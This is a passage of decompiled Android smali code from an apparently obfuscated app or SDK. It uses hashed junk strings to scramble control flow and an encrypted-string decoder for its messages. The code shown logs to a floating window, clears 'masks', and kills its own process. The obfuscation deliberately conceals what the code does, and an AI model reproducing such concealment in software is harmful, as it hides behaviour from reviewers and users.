    const-string v3, "\u06dc\u06e4\u06eb\u06d8\u06e0\u06e5\u06eb\u06e4\u06db\u06dc\u06e6\u06d8\u06d7\u06dc\u06e1\u06d8\u06e4\u06e5\u06e6\u06d7\u06df\u06d9\u06e1\u06e8\u06e5\u06d8\u06df\u06d8\u06db\u06d6\u06da\u06eb"

    goto :goto_67

    :sswitch_121
    if-nez v4, :cond_25

    const-string v3, "\u06e5\u06e0\u06d8\u06d8\u06e1\u06d7\u06e2\u06db\u06da\u06da\u06e7\u06e8\u06ec\u06e7\u06e5\u06e5\u06e6\u06e6\u06d6\u06da\u06d9\u06e2\u06d6\u06eb\u06e4\u06e7\u06d8\u06ec\u06d6\u06e4\u06df\u06e7\u06d9\u06d9\u06da\u06db\u06e0\u06df\u06d9\u06e6\u06d8\u06e0\u06e7\u06e6\u06e2\u06db\u06d8\u06df\u06d6\u06e5"

    goto :goto_67

    :sswitch_122
    const-string v3, "\u06e6\u06e1\u06d8\u06da\u06d6\u06e7\u06e8\u06e5\u06e6\u06d8\u06df\u06e1\u06e6\u06d8\u06d6\u06e5\u06d9\u06eb\u06d7\u06e5\u06d8\u06e6\u06e6\u06d6\u06d8\u06df\u06e2\u06e7\u06db\u06ec\u06d8\u06e5\u06e2\u06db\u06e1\u06e4\u06e1\u06d8\u06e8\u06d7\u06e6\u06d8\u06d7\u06d7\u06d7\u06eb\u06e8\u06e8\u06d8\u06eb\u06dc\u06d7\u06e0\u06d7\u06d9\u06d9\u06dc\u06d7\u06df\u06df\u06d8\u06d8"

    goto :goto_67

    :sswitch_123
    const-string v3, "\u06e2\u06d7\u06e1\u06dc\u06d7\u06dc\u06e5\u06dc\u06e2\u06e2\u06e1\u06e7\u06d8\u06e6\u06e2\u06da\u06ec\u06dc\u06d7\u06df\u06eb\u06e7\u06d9\u06e4\u06db\u06df\u06e5\u06dc\u06d9\u06dc\u06e5\u06d8\u06dc\u06df\u06e0\u06d6\u06e4\u06e1\u06d9\u06e1\u06e5\u06e7\u06dc\u06e5\u06eb\u06e8\u06e7\u06e4\u06d7\u06dc\u06e8\u06e8\u06eb\u06d7\u06e8\u06e4"

    goto :goto_65

    :sswitch_124
    const-string v3, "\u06dc\u06d6\u06db\u06e5\u06ec\u06e7\u06e7\u06e1\u06d8\u06d6\u06d8\u06ec\u06e0\u06d9\u06e2\u06e2\u06e7\u06e7\u06e7\u06e0\u06e1\u06eb\u06df\u06e7\u06e7\u06e4\u06e1\u06e0\u06d9\u06e6\u06d6\u06e1\u06e6\u06d8\u06dc\u06d8\u06e7\u06e8\u06d6\u06d8\u06e6\u06d7\u06e7\u06da\u06e2\u06e7\u06e0\u06d8\u06e4"

    goto :goto_66

    :sswitch_125
    const v5, -0x14c04993

    const-string v3, "\u06d7\u06d9\u06e1\u06d8\u06eb\u06e0\u06d7\u06da\u06e2\u06d9\u06d9\u06e8\u06d6\u06ec\u06df\u06d6\u06e1\u06e7\u06d8\u06e2\u06e0\u06e6\u06d9\u06e7\u06e5\u06d8\u06d7\u06d8\u06dc\u06d8\u06e2\u06d7\u06e7\u06df\u06db\u06d6\u06db\u06db\u06d8"

    :goto_68
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_4f

    goto :goto_68

    :sswitch_126
    if-eqz p9, :cond_26

    const-string v3, "\u06d9\u06e8\u06d8\u06d8\u06d7\u06e8\u06e6\u06e1\u06e1\u06da\u06d9\u06df\u06d6\u06e4\u06df\u06da\u06d8\u06eb\u06e2\u06e8\u06df\u06e0\u06ec\u06dc\u06e0\u06e4\u06e6\u06ec\u06e5\u06dc"

    goto :goto_68

    :cond_26
    const-string v3, "\u06e0\u06db\u06e2\u06db\u06d9\u06dc\u06d6\u06e1\u06dc\u06df\u06e2\u06e5\u06db\u06e2\u06e0\u06da\u06e1\u06eb\u06ec\u06db\u06d8\u06db\u06dc\u06d7\u06d9\u06d7\u06dc\u06e5\u06e1\u06d8\u06e6\u06d6\u06df\u06db\u06da\u06e6\u06e0\u06e4\u06dc\u06db\u06eb\u06e1\u06e7\u06e7\u06e2\u06d9\u06e6\u06e7\u06d8\u06e8\u06df\u06e5\u06d8\u06e1\u06ec\u06ec"

    goto :goto_68

    :sswitch_127
    const-string v3, "\u06e5\u06d7\u06d8\u06df\u06dc\u06d7\u06e8\u06e0\u06eb\u06e0\u06e8\u06d8\u06e5\u06e1\u06d6\u06e6\u06da\u06e8\u06e8\u06e1\u06e1\u06d6\u06e0\u06e1\u06da\u06e8\u06e8\u06e6\u06e2\u06e0\u06d7\u06e4\u06db\u06e8\u06e6\u06eb\u06d9\u06ec\u06e8\u06d8\u06d9\u06e0\u06d8\u06d8"

    goto :goto_68

    :sswitch_128
    const-string v3, "\u06da\u06ec\u06e2\u06dc\u06e8\u06e6\u06d8\u06d6\u06e6\u06e6\u06d8\u06eb\u06e4\u06e1\u06d9\u06d8\u06dc\u06d8\u06e0\u06e1\u06d8\u06e1\u06db\u06d6\u06ec\u06ec\u06db\u06d8\u06df\u06d6\u06d8\u06e8\u06e6\u06eb\u06e1\u06e6\u06dc\u06e4\u06df\u06ec\u06db\u06d6\u06e5\u06d7\u06e4\u06d6\u06d8\u06d6\u06d6\u06d8\u06d8\u06eb\u06d6\u06eb\u06d7\u06d9\u06d8\u06d8\u06e8\u06ec\u06e0"

    goto :goto_66

    :sswitch_129
    const v4, -0x58cd317c

    const-string v3, "\u06df\u06d8\u06e5\u06e8\u06e6\u06e5\u06d8\u06e0\u06e5\u06ec\u06da\u06d6\u06d7\u06e1\u06d8\u06e5\u06e2\u06e2\u06d9\u06e6\u06ec\u06e7\u06e7\u06e6\u06d8\u06e2\u06db\u06dc\u06d7\u06ec\u06e4\u06e2\u06ec\u06e2\u06d9\u06dc\u06e6"

    :goto_69
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_50

    goto :goto_69

    :sswitch_12a
    const v5, -0x30743b89

    const-string v3, "\u06d6\u06d8\u06e5\u06db\u06e2\u06e2\u06e4\u06da\u06dc\u06d8\u06eb\u06e5\u06e6\u06d8\u06e6\u06dc\u06e0\u06e5\u06e5\u06e6\u06d7\u06d9\u06e0\u06df\u06d7\u06ec\u06ec\u06d7\u06ec\u06ec\u06eb\u06dc\u06e0\u06d8\u06da\u06e8\u06eb\u06d6\u06db\u06ec\u06eb\u06e4\u06df\u06e0\u06db\u06e8\u06ec\u06ec\u06dc"

    :goto_6a
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_51

    goto :goto_6a

    :sswitch_12b
    const-string v3, "\u06db\u06da\u06d8\u06d8\u06db\u06e4\u06d9\u06e2\u06e7\u06d6\u06dc\u06e0\u06ec\u06eb\u06e5\u06e8\u06e6\u06eb\u06d8\u06d6\u06ec\u06e6\u06d8\u06d6\u06e4\u06e8\u06df\u06dc\u06e5\u06d8\u06e1\u06e7\u06e6\u06d8\u06df\u06dc\u06df\u06d8\u06e1\u06df\u06d7\u06e6\u06df\u06d7\u06df\u06eb\u06e5\u06d8\u06dc\u06d7\u06d6\u06da\u06df\u06d7\u06e4\u06e0\u06d6\u06d8"

    goto :goto_6a

    :sswitch_12c
    const-string v3, "\u06e0\u06e1\u06e6\u06d8\u06eb\u06d7\u06eb\u06e1\u06df\u06d6\u06d6\u06e5\u06dc\u06d8\u06dc\u06df\u06e5\u06e2\u06eb\u06db\u06e4\u06df\u06e8\u06da\u06e4\u06e5\u06d8\u06eb\u06e5\u06d7\u06e7\u06e8\u06ec"

    goto :goto_69

    :cond_27
    const-string v3, "\u06e2\u06e6\u06db\u06dc\u06da\u06e2\u06da\u06e5\u06d8\u06e2\u06d9\u06e5\u06d8\u06e0\u06e4\u06e5\u06d8\u06dc\u06dc\u06e6\u06e6\u06e6\u06d8\u06da\u06e7\u06d8\u06d8\u06d6\u06dc\u06d8\u06d8\u06d9\u06e8\u06ec\u06db\u06e5\u06e2\u06dc\u06da\u06db\u06eb\u06ec\u06d6\u06d6\u06e5\u06d8\u06e5\u06d7\u06d7\u06d6\u06e2"

    goto :goto_6a

    :sswitch_12d
    const/4 v3, 0x0

    aget-boolean v3, p7, v3

    if-eqz v3, :cond_27

    const-string v3, "\u06d8\u06e4\u06e5\u06e8\u06eb\u06d8\u06db\u06d8\u06d8\u06e6\u06eb\u06e6\u06d6\u06d6\u06e0\u06e4\u06e8\u06d8\u06e0\u06ec\u06d7\u06ec\u06db\u06d8\u06d8\u06df\u06d6\u06d6\u06e6\u06e5\u06d6\u06db\u06db\u06d8\u06d8\u06da\u06e5\u06dc\u06d8\u06da\u06e1\u06da\u06eb\u06d8\u06d8"

    goto :goto_6a

    :sswitch_12e
    const-string v3, "\u06eb\u06e1\u06e7\u06d8\u06d7\u06e4\u06ec\u06d8\u06d8\u06e0\u06e0\u06d9\u06e7\u06e6\u06d7\u06e8\u06da\u06e7\u06d9\u06e0\u06db\u06e5\u06d9\u06da\u06e6\u06e8\u06d9\u06e7\u06db\u06d7\u06d6\u06d8"

    goto :goto_69

    :sswitch_12f
    const-string v3, "\u06da\u06e1\u06ec\u06e4\u06df\u06d9\u06ec\u06ec\u06e4\u06d9\u06e4\u06e6\u06e4\u06e7\u06e4\u06e6\u06e7\u06e1\u06d7\u06e7\u06e4\u06df\u06e2\u06eb\u06e8\u06db\u06dc\u06db\u06ec\u06d9"

    goto :goto_69

    :sswitch_130
    const/4 v3, 0x0

    const/4 v4, 0x0

    aget v4, p10, v4

    add-int/lit8 v4, v4, 0x1

    aput v4, p10, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    aput-boolean v4, p7, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    aput-boolean v4, p8, v3

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "JmpPODFshCdjE0hvSULucEtmGHEAzA==\n"

    const-string v5, "w/b/3azsYpY=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v4, 0x0

    aget v4, p10, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, "qR80SQtROgEmYg==\n"

    const-string v5, "ifeJ5+7hp+k=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "JhheTw==\n"

    const-string v5, "UXksIRdreQs=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    const v4, 0x69191656

    const-string v3, "\u06d6\u06e6\u06e1\u06d8\u06eb\u06e0\u06dc\u06d7\u06da\u06e5\u06e0\u06e8\u06d9\u06da\u06e6\u06d8\u06da\u06e6\u06e4\u06d6\u06e8\u06df\u06df\u06d6\u06db\u06e8\u06e8\u06d9\u06db\u06e5\u06eb\u06e0\u06d6\u06d8\u06da\u06e7\u06dc\u06eb\u06e0\u06e4\u06df\u06d6\u06e2\u06e0\u06e8\u06e7\u06d8\u06eb\u06e5\u06d9\u06e6\u06e0\u06e8\u06eb\u06eb\u06eb"

    :goto_6b
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_52

    goto :goto_6b

    :sswitch_131
    const-string v3, "\u06e6\u06d7\u06e7\u06e2\u06d6\u06db\u06e5\u06e6\u06e7\u06d7\u06da\u06e6\u06d8\u06dc\u06e5\u06db\u06d9\u06e6\u06ec\u06e1\u06d9\u06e6\u06dc\u06db\u06e1\u06e7\u06e1\u06e2\u06e2\u06e0\u06d6"

    goto :goto_6b

    :sswitch_132
    const-string v3, "\u06d9\u06e8\u06db\u06db\u06d7\u06e4\u06e6\u06e1\u06e6\u06da\u06d8\u06d7\u06e0\u06d7\u06dc\u06ec\u06ec\u06e8\u06d8\u06e8\u06e7\u06e1\u06e0\u06e4\u06e7\u06e6\u06e8\u06dc\u06d8\u06da\u06eb\u06e6\u06e6\u06d9\u06e8\u06d9\u06d9\u06e7\u06ec\u06e8\u06d8\u06e8\u06e1\u06e0\u06d9\u06da\u06eb\u06d7\u06dc\u06e2"

    goto :goto_6b

    :sswitch_133
    const v5, 0x4ad590e

    const-string v3, "\u06e5\u06dc\u06e2\u06e1\u06d7\u06e1\u06d8\u06e0\u06ec\u06e6\u06df\u06df\u06e5\u06dc\u06dc\u06e2\u06e4\u06db\u06e8\u06d8\u06da\u06e6\u06e0\u06e5\u06e2\u06da\u06db\u06e6\u06eb\u06ec\u06d7\u06e2\u06e5\u06e4\u06da\u06d8\u06eb\u06df\u06d8\u06ec\u06e1\u06e4\u06df\u06e1\u06e1\u06da\u06e1\u06d8\u06d9\u06df\u06df"

    :goto_6c
    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v5

    sparse-switch v6, :sswitch_data_53

    goto :goto_6c

    :sswitch_134
    const/4 v3, 0x0

    aget v3, p10, v3

    const/4 v6, 0x2

    if-lt v3, v6, :cond_28

    const-string v3, "\u06e5\u06e6\u06d6\u06d8\u06e0\u06e0\u06d7\u06e7\u06dc\u06da\u06d7\u06db\u06e2\u06e8\u06d8\u06d6\u06da\u06db\u06e6\u06d8\u06df\u06d7\u06e1\u06e7\u06e1\u06e5\u06e8\u06e1\u06dc\u06e2\u06d8\u06d9\u06ec\u06db\u06e0\u06dc\u06e7\u06e1\u06d8\u06e7\u06ec\u06dc\u06d7\u06e0\u06eb\u06d8\u06dc\u06e4\u06d8\u06db\u06e5\u06db\u06e0"

    goto :goto_6c

    :cond_28
    const-string v3, "\u06e2\u06e5\u06da\u06dc\u06db\u06e8\u06eb\u06e2\u06e6\u06d8\u06dc\u06d9\u06db\u06dc\u06eb\u06e0\u06e4\u06e8\u06db\u06da\u06d7\u06d9\u06e8\u06e1\u06d8\u06e4\u06e7\u06e4\u06e7\u06e8\u06d6\u06d7\u06ec\u06e1\u06d6\u06da\u06db\u06d8\u06ec\u06d7\u06eb\u06d7\u06da\u06eb\u06e8\u06e6\u06eb\u06db"

    goto :goto_6c

    :sswitch_135
    const-string v3, "\u06dc\u06e8\u06dc\u06d8\u06e4\u06d6\u06d9\u06d6\u06e2\u06db\u06db\u06d9\u06da\u06d8\u06d6\u06dc\u06d8\u06df\u06e6\u06e8\u06d8\u06e1\u06e2\u06d7\u06d8\u06df\u06e0\u06e5\u06df\u06eb\u06df\u06e2\u06e6\u06e4\u06e5\u06e6\u06d8\u06d9\u06db\u06e8\u06d8\u06dc\u06d7\u06ec\u06d9\u06e1\u06e6\u06e2\u06eb\u06e6\u06d8\u06db\u06e1\u06d8\u06d8\u06e1\u06e4\u06e0\u06e6\u06df\u06d8\u06d8"

    goto :goto_6c

    :sswitch_136
    const-string v3, "\u06e7\u06e6\u06e8\u06d8\u06e1\u06e4\u06e5\u06d8\u06e1\u06db\u06e0\u06e8\u06d9\u06d6\u06d8\u06db\u06e7\u06eb\u06e6\u06da\u06db\u06e1\u06e5\u06e2\u06e6\u06d8\u06d8\u06eb\u06e5\u06d8\u06d8\u06e5\u06d8\u06e7\u06d6\u06df\u06da\u06db\u06e7\u06ec"

    goto :goto_6b

    :sswitch_137
    const-string v2, "SL7qDzJES98c49NqcWIOphu0p20aNgrOjDRuAip9Qf8g4vVncU8EqyKxq2UBNibzRYPDDSp9Qf8g\n4fV5cU4xqxOdqUIc\n"

    const-string v3, "rAZO6pfTrkM=\n"

    invoke-static {v2, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "SbqS7ic=\n"

    const-string v4, "LMjggVUtNiQ=\n"

    invoke-static {v3, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lapi/repository/ActivityKeeper;->clearAllMasks()V

    const v3, -0x4ba4e76d

    const-string v2, "\u06dc\u06e1\u06e6\u06db\u06e1\u06e7\u06e4\u06db\u06e5\u06d8\u06ec\u06df\u06d6\u06d8\u06db\u06e8\u06da\u06e1\u06eb\u06d8\u06eb\u06d9\u06d6\u06e1\u06d8\u06e7\u06d8\u06e0\u06e2\u06d6\u06e0\u06ec\u06dc\u06da\u06d6\u06dc\u06d8\u06e4\u06ec\u06d8\u06d9\u06e8\u06e1\u06eb\u06e6\u06e7"

    :goto_6d
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_54

    goto :goto_6d

    :sswitch_138
    const v4, -0x4c7fa58a

    const-string v2, "\u06d6\u06e0\u06e1\u06d8\u06da\u06d6\u06e1\u06e0\u06e7\u06e2\u06e7\u06da\u06e0\u06d8\u06e0\u06e0\u06df\u06dc\u06eb\u06e7\u06d6\u06d9\u06d6\u06d8\u06d8\u06d9\u06da\u06e5\u06d7\u06da\u06e1\u06e0\u06d9\u06d8\u06e1\u06d8\u06e7\u06db\u06e6\u06d8\u06dc\u06dc\u06e4"

    :goto_6e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    xor-int/2addr v5, v4

    sparse-switch v5, :sswitch_data_55

    goto :goto_6e

    :sswitch_139
    sget-object v2, Lcom/zyyad/gamf/kXEoVYTwnQIy;->NETWORK:Ljava/lang/String;

    const-string v5, "zA7O3FWurNncDt0=\n"

    const-string v6, "ly2AmQH544s=\n"

    invoke-static {v5, v6}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Lj$/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_29

    const-string v2, "\u06df\u06d7\u06e1\u06d7\u06e5\u06e0\u06e2\u06e7\u06e6\u06d8\u06e2\u06e4\u06d6\u06d6\u06d8\u06e8\u06d6\u06df\u06ec\u06ec\u06dc\u06dc\u06e1\u06d9\u06e8\u06eb\u06d9\u06df\u06e5\u06e2\u06e1\u06db\u06db\u06e5\u06d6\u06d8\u06d7\u06df\u06dc\u06e0\u06da\u06d8\u06d8\u06eb\u06db\u06d7\u06eb\u06db\u06e1\u06e2\u06ec\u06db\u06eb\u06e8\u06e5"

    goto :goto_6e

    :sswitch_13a
    const-string v2, "\u06ec\u06da\u06dc\u06e7\u06e2\u06e6\u06d8\u06e6\u06ec\u06d8\u06d8\u06d9\u06e6\u06db\u06d9\u06e0\u06d9\u06e1\u06e0\u06e8\u06d8\u06e1\u06db\u06dc\u06da\u06eb\u06d7\u06eb\u06d8\u06e6\u06d8\u06e8\u06d8\u06d7\u06e7\u06e8\u06db\u06ec\u06e5\u06d8"

    goto :goto_6d

    :cond_29
    const-string v2, "\u06da\u06e1\u06d7\u06e2\u06db\u06e4\u06e0\u06d8\u06e1\u06ec\u06e5\u06dc\u06eb\u06da\u06d7\u06e2\u06d6\u06d7\u06e6\u06d6\u06d8\u06dc\u06ec\u06d8\u06dc\u06ec\u06da\u06d8\u06e1\u06dc\u06d8\u06e8\u06e1\u06e8\u06e5\u06df\u06dc\u06dc\u06e2\u06dc\u06d8\u06d9\u06e8\u06e4\u06e2\u06df\u06dc\u06d8\u06d8\u06d8\u06db\u06d8\u06e7\u06d8\u06ec\u06df\u06e4"

    goto :goto_6e

    :sswitch_13b
    const-string v2, "\u06df\u06eb\u06dc\u06d8\u06e8\u06d7\u06e7\u06d6\u06e7\u06df\u06d8\u06dc\u06e4\u06eb\u06d9\u06dc\u06d8\u06d7\u06e0\u06e6\u06d9\u06d6\u06e6\u06d8\u06e1\u06d9\u06df\u06e2\u06d8\u06e7\u06d8\u06dc\u06e2\u06e5\u06d8\u06e6\u06e5\u06e1\u06d8\u06d6\u06da\u06eb"

    goto :goto_6e

    :sswitch_13c
    const-string v2, "\u06dc\u06df\u06dc\u06d8\u06d7\u06db\u06e8\u06e5\u06e1\u06e8\u06d8\u06e8\u06ec\u06e1\u06d8\u06ec\u06da\u06e2\u06db\u06dc\u06df\u06db\u06e4\u06e5\u06eb\u06df\u06e6\u06e0\u06e6\u06e4\u06e2\u06e8\u06e4\u06e7\u06eb\u06d7\u06e1\u06df\u06e1\u06dc\u06df\u06e5\u06d8\u06dc\u06d7\u06eb\u06ec\u06e4\u06d6\u06d8\u06e5\u06da\u06dc\u06da\u06e1\u06ec\u06d6\u06dc\u06e8\u06d8"

    goto :goto_6d

    :sswitch_13d
    const-string v2, "\u06eb\u06e5\u06e6\u06e4\u06d7\u06dc\u06d8\u06e0\u06db\u06dc\u06d8\u06e7\u06eb\u06da\u06d9\u06da\u06d8\u06dc\u06e2\u06d6\u06eb\u06ec\u06e8\u06d6\u06e1\u06e8\u06d8\u06e7\u06d8\u06e4\u06d7\u06e6\u06e8\u06e4\u06e5\u06d8\u06d8\u06df\u06d7\u06e5\u06e2\u06eb\u06e1\u06d8\u06d8\u06d6\u06dc"

    goto :goto_6d

    :sswitch_13e
    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v2

    invoke-static {v2}, Landroid/os/Process;->killProcess(I)V

    goto/16 :goto_2d

    :sswitch_13f
    const/4 v3, 0x0

    xor-int/lit8 v4, p9, 0x1

    aput v4, p0, v3

    goto/16 :goto_24

    :cond_2a
    const-string v3, "\u06da\u06df\u06dc\u06e2\u06e7\u06e8\u06d8\u06d6\u06e8\u06d6\u06e2\u06ec\u06e8\u06d8\u06e6\u06d7\u06e5\u06d8\u06e1\u06ec\u06e4\u06d8\u06e2\u06d9\u06e7\u06e1\u06e0\u06e7\u06e1\u06e2\u06db\u06eb\u06d6\u06e0\u06e7\u06e2\u06df\u06e8\u06e1\u06d6\u06e7\u06d8\u06db\u06df\u06df\u06e4\u06e1\u06e5\u06e4\u06da"

    goto/16 :goto_26

    :sswitch_140
    const/4 v3, 0x0

    aget v3, p0, v3

    if-nez v3, :cond_2a

    const-string v3, "\u06e1\u06ec\u06eb\u06e0\u06db\u06dc\u06d8\u06e2\u06e5\u06d7\u06dc\u06da\u06e4\u06d8\u06d7\u06e0\u06d8\u06db\u06d6\u06d8\u06e8\u06e7\u06d8\u06d7\u06df\u06d7\u06e5\u06eb\u06e7\u06d8\u06e6\u06dc\u06d8\u06ec\u06d6\u06db\u06e6\u06d9\u06e6\u06eb\u06eb\u06e4\u06e8\u06e2\u06d8\u06e4\u06d7\u06db"

    goto/16 :goto_26

    :sswitch_141
    const-string v3, "\u06df\u06e4\u06e1\u06d7\u06e5\u06e7\u06d8\u06e6\u06e0\u06d6\u06e4\u06d6\u06dc\u06eb\u06da\u06e7\u06ec\u06dc\u06d8\u06d7\u06d7\u06e6\u06d8\u06da\u06e2\u06e5\u06d8\u06e0\u06eb\u06e5\u06db\u06ec\u06e6\u06d8\u06df\u06d7\u06e1\u06d8\u06df\u06df\u06e5\u06d8\u06d8\u06ec\u06dc\u06e8\u06e6\u06e4"

    goto/16 :goto_26

    :sswitch_142
    const-string v3, "\u06e4\u06e4\u06dc\u06d8\u06eb\u06e0\u06da\u06d6\u06d9\u06d8\u06d8\u06e6\u06e8\u06e0\u06e2\u06da\u06e1\u06d8\u06df\u06d6\u06e6\u06e0\u06d7\u06d8\u06e2\u06ec\u06d8\u06d7\u06e5\u06e8\u06d9\u06d8\u06d8\u06e4\u06e1\u06e4\u06e2\u06e8\u06db"

    goto/16 :goto_25

    :sswitch_143
    const-string v3, "\u06ec\u06e1\u06e8\u06e6\u06e5\u06e7\u06db\u06e7\u06e7\u06da\u06e7\u06eb\u06e1\u06d7\u06d9\u06dc\u06e5\u06d7\u06e1\u06e7\u06db\u06e7\u06d9\u06e4\u06db\u06e2\u06df\u06df\u06e2\u06d8\u06d7\u06e1\u06e1\u06e0\u06e7\u06d6\u06df\u06ec\u06d6\u06d8\u06db\u06e8\u06eb\u06e7\u06e5\u06e7\u06dc\u06eb\u06d7"

    goto/16 :goto_25

    :sswitch_144
    const/4 v3, 0x0

    aget v3, p2, v3

    aget-object v3, p1, v3

    :goto_6f
    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "Db14ag==\n"

    const-string v5, "etwKBEPYiEs=\n"

    invoke-static {v4, v5}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    :sswitch_145
    const-wide/16 v4, 0x3e8

    :try_start_2e
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2e
    .catch Ljava/lang/InterruptedException; {:try_start_2e .. :try_end_2e} :catch_8

    :goto_70
    move-object v3, v2

    goto/16 :goto_0

    :sswitch_146
    sget-object v3, LCu7y/sdk/g0;->a:[Ljava/lang/String;

    const/4 v5, 0x0

    aget v5, p2, v5

    aget-object v3, v3, v5

    goto :goto_6f

    :catch_8
    move-exception v3

    goto :goto_70

    :catch_9
    move-exception v2

    goto/16 :goto_1f

    :catch_a
    move-exception v2

    goto/16 :goto_1e

    :catch_b
    move-exception v4

    move-object v5, v4

    goto/16 :goto_17

    :catch_c
    move-exception v4

    goto/16 :goto_11

    :sswitch_147
    move-object v6, v2

    goto/16 :goto_6

    nop

    :sswitch_data_0
    .sparse-switch
        -0x6e8ecf67 -> :sswitch_6
        -0x684a9151 -> :sswitch_2
        0x2883078d -> :sswitch_9
        0x38f84d11 -> :sswitch_0
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x7fbcefd1 -> :sswitch_4
        -0x5ffcc8fd -> :sswitch_1
        0x839f850 -> :sswitch_5
        0x217ab4cc -> :sswitch_3
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x44259bc2 -> :sswitch_147
        0x24d53749 -> :sswitch_7
        0x3912c3ab -> :sswitch_e
        0x52b574f6 -> :sswitch_d
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        -0x6697356f -> :sswitch_b
        0x4b482df -> :sswitch_c
        0x541e3ea9 -> :sswitch_8
        0x5b56f68d -> :sswitch_a
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x64952b98 -> :sswitch_1a
        -0x41baa71 -> :sswitch_16
        0xa0a352d -> :sswitch_1b
        0x18ecb420 -> :sswitch_f
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x328f9a0d -> :sswitch_10
        -0xcd9367b -> :sswitch_22
        0x46d5c09e -> :sswitch_1d
        0x6e330e08 -> :sswitch_21
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        -0x79cef5e0 -> :sswitch_12
        0xe2eee0a -> :sswitch_37
        0x75919a61 -> :sswitch_36
        0x778eaa8b -> :sswitch_32
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        -0x52a8f837 -> :sswitch_13
        -0x4f1cce10 -> :sswitch_52
        -0x11e4d328 -> :sswitch_108
        0x387a641 -> :sswitch_51
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x2705bdca -> :sswitch_50
        0xcc98f43 -> :sswitch_4e
        0x1e8f78a8 -> :sswitch_14
        0x4146ffb1 -> :sswitch_4f
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x12b67f72 -> :sswitch_15
        0x60c1905 -> :sswitch_18
        0x465d95b4 -> :sswitch_17
        0x48603842 -> :sswitch_19
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0xa3a38f2 -> :sswitch_1c
        0x712b586 -> :sswitch_1e
        0x13829ed1 -> :sswitch_20
        0x6f2f83a4 -> :sswitch_1f
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        0x2e26c23 -> :sswitch_27
        0x145b65f9 -> :sswitch_23
        0x17f77642 -> :sswitch_11
        0x62271c6a -> :sswitch_2b
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        -0x57e4ad46 -> :sswitch_30
        -0x2b0ddd52 -> :sswitch_2f
        0x2924f526 -> :sswitch_11
        0x46be4597 -> :sswitch_24
    .end sparse-switch

    :sswitch_data_d
    .sparse-switch
        -0x224b610 -> :sswitch_2e
        -0x17b6a1b -> :sswitch_25
        0x20efd47c -> :sswitch_2d
        0x5e5c750d -> :sswitch_2c
    .end sparse-switch

    :sswitch_data_e
    .sparse-switch
        -0x7391f05b -> :sswitch_26
        -0xa7347b0 -> :sswitch_2a
        0x9c53a0a -> :sswitch_28
        0x751e2b0a -> :sswitch_29
    .end sparse-switch

    :sswitch_data_f
    .sparse-switch
        -0x60cb02d4 -> :sswitch_35
        -0x49a550ab -> :sswitch_31
